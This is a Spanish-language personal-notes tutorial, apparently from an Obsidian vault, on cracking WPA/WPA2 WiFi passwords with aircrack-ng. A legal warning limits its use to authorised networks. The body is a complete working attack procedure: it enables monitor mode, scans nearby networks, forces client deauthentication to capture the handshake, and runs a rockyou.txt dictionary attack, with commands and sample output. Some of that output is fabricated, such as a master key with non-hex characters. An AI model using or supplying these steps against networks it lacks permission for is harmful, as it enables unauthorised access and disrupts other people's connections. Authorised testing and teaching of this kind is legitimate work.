---
title: ataque de fuerza bruta a red wifi
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, explotacion]
created: 2026-01-28
updated: 2026-10-12
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]"]
---

# Ataque de Fuerza Bruta a WiFi con Aircrack-ng

> ⚠️ **ADVERTENCIA LEGAL**: Esta guía es únicamente con fines educativos. Solo realiza estas pruebas en TU PROPIA red WiFi o con autorización escrita del propietario. Acceder a redes ajenas sin permiso es un DELITO PENAL en todos los países.

## 📋 ¿Qué vamos a hacer?

Vamos a intentar descubrir la contraseña de una red WiFi WPA/WPA2 capturando el "handshake" (apretón de manos) que ocurre cuando un dispositivo se conecta a la red, y luego probaremos contraseñas de un diccionario hasta encontrar la correcta.

---

## 🛠️ Requisitos Previos

### Hardware Necesario

- **Tarjeta WiFi compatible con modo monitor**
    - Ejemplos: Alfa AWUS036NHA, TP-Link TL-WN722N v1
    - Tu tarjeta WiFi normal del laptop _puede_ funcionar (pero muchas no lo hacen)

### Software Necesario

bash

```bash
# En Kali Linux ya viene instalado
# En Ubuntu/Debian:
sudo apt update
sudo apt install aircrack-ng
```

### Diccionario de Contraseñas

El más usado es **rockyou.txt**:

bash

```bash
# Ubicación en Kali Linux:
/usr/share/wordlists/rockyou.txt.gz

# Descomprimirlo:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 📝 Paso a Paso (CON EJEMPLOS)

### PASO 1: Identificar tu Tarjeta WiFi

bash

````bash
iwconfig
```

**Salida de ejemplo:**
```
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   
          Tx-Power=20 dBm
````

En este caso, nuestra tarjeta se llama **wlan0** ✅

---

### PASO 2: Activar Modo Monitor

El modo monitor permite "escuchar" todo el tráfico WiFi del aire.

bash

````bash
# Matar procesos que puedan interferir
sudo airmon-ng check kill

# Activar modo monitor
sudo airmon-ng start wlan0
```

**Salida de ejemplo:**
```
PHY     Interface       Driver          Chipset

phy0    wlan0           rtl8187         Realtek RTL8187

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
````

Tu interfaz ahora se llama **wlan0mon** (o similar) ✅

---

### PASO 3: Escanear Redes WiFi Cercanas

bash

````bash
sudo airodump-ng wlan0mon
```

**Salida de ejemplo:**
```
 CH 11 ][ Elapsed: 12 s ][ 2026-01-28 15:30 

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 A4:12:34:56:78:9A  -45       23        0    0   6  130  WPA2 CCMP   PSK  MiCasaWiFi
 B8:98:76:54:32:10  -67       15        5    0  11  270  WPA2 CCMP   PSK  VecinoJuan
 C2:AA:BB:CC:DD:EE  -82        8        0    0   1   65  WPA2 CCMP   PSK  Movistar_1234

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 A4:12:34:56:78:9A  E0:11:22:33:44:55  -40    0 - 1      0       12
````

**Anota estos datos de tu red objetivo:**

- **BSSID**: `A4:12:34:56:78:9A` (dirección MAC del router)
- **Canal**: `6` (CH)
- **ESSID**: `MiCasaWiFi` (nombre de la red)

Presiona `Ctrl + C` para detener el escaneo.

---

### PASO 4: Capturar el Handshake

Ahora vamos a enfocarnos en UNA red específica para capturar el handshake.

bash

````bash
sudo airodump-ng -c 6 --bssid A4:12:34:56:78:9A -w captura wlan0mon
```

Desglosando el comando:
- `-c 6`: canal de la red
- `--bssid A4:12:34:56:78:9A`: MAC del router objetivo
- `-w captura`: guardar captura en archivo "captura-01.cap"
- `wlan0mon`: nuestra interfaz en modo monitor

**Salida de ejemplo:**
```
 CH  6 ][ Elapsed: 1 min ][ 2026-01-28 15:35 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 A4:12:34:56:78:9A  -42 100       89       23    4   6  130  WPA2 CCMP   PSK  MiCasaWiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 A4:12:34:56:78:9A  E0:11:22:33:44:55  -38    0e- 1e     0      145  MiCasaWiFi
````

**Deja esta terminal abierta** 🔴 Necesitamos que alguien se conecte a la red para capturar el handshake.

---

### PASO 5: Forzar el Handshake (Desautenticación)

Si no quieres esperar a que alguien se conecte naturalmente, puedes "desconectar" a un cliente conectado. **Abre una NUEVA terminal** y ejecuta:

bash

````bash
sudo aireplay-ng --deauth 10 -a A4:12:34:56:78:9A wlan0mon
```

Desglosando:
- `--deauth 10`: enviar 10 paquetes de desautenticación
- `-a A4:12:34:56:78:9A`: BSSID del router objetivo

**Salida de ejemplo:**
```
15:37:21  Waiting for beacon frame (BSSID: A4:12:34:56:78:9A) on channel 6
15:37:21  Sending 64 directed DeAuth (code 7). STMAC: [E0:11:22:33:44:55]
15:37:22  Sending 64 directed DeAuth (code 7). STMAC: [E0:11:22:33:44:55]
```

**En la terminal anterior (donde corre airodump-ng), deberías ver:**
```
[ WPA handshake: A4:12:34:56:78:9A
````

🎉 **¡ÉXITO!** Has capturado el handshake. Presiona `Ctrl + C` para detener airodump-ng.

---

### PASO 6: Verificar la Captura

bash

````bash
ls -lh captura*
```

**Deberías ver archivos como:**
```
-rw-r--r-- 1 root root  85K ene 28 15:38 captura-01.cap
-rw-r--r-- 1 root root  521 ene 28 15:38 captura-01.csv
````

---

### PASO 7: Ataque de Fuerza Bruta

Ahora viene la parte donde probamos contraseñas del diccionario:

bash

````bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b A4:12:34:56:78:9A captura-01.cap
```

Desglosando:
- `-w /usr/share/wordlists/rockyou.txt`: ruta al diccionario
- `-b A4:12:34:56:78:9A`: BSSID objetivo
- `captura-01.cap`: archivo con el handshake

**Salida de ejemplo (en progreso):**
```
                               Aircrack-ng 1.7

      [00:01:23] 45872/14344391 keys tested (623.45 k/s) 

      Time left: 6 hours, 23 minutes, 12 seconds                  0.32%

                           KEY FOUND! [ password123 ]


      Master Key     : A1 B2 C3 D4 E5 F6 G7 H8 I9 J0 K1 L2 M3 N4 O5 P6
                       Q7 R8 S9 T0 U1 V2 W3 X4 Y5 Z6 A7 B8 C9 D0 E1 F2

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF
````

🎉 **¡CONTRASEÑA ENCONTRADA!**: `password123`

---

### PASO 8: Limpiar y Desactivar Modo Monitor

bash

```bash
# Detener modo monitor
sudo airmon-ng stop wlan0mon

# Reiniciar NetworkManager
sudo systemctl restart NetworkManager
```

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Metasploit]]
